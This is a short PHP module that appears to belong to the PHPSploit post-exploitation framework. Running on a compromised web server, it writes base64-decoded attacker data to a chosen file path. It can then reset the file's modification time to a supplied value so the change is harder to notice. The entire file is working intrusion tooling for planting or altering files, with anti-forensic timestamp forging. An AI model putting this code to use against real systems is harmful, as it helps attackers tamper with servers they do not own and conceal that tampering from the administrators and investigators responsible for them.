<?php

// If we fail to get a file descriptor, throw permission error
if (($file = @fopen($PHPSPLOIT['FILE'], 'w')) === False)
    return error("%s: Write permission denied", $PHPSPLOIT['FILE']);

// Decode new file contents info $data
$data = base64_decode($PHPSPLOIT['DATA']);

// If full data couln't be written, throw write error
if (@fwrite($file, $data) === False)
    return error("%s: Could not write to file", $PHPSPLOIT['FILE']);

@fclose($file);

if ($PHPSPLOIT['MTIME'])
{
    if (!touch($PHPSPLOIT['FILE'], $PHPSPLOIT['MTIME']))
        return "MTIME_FAILED";
}

?>
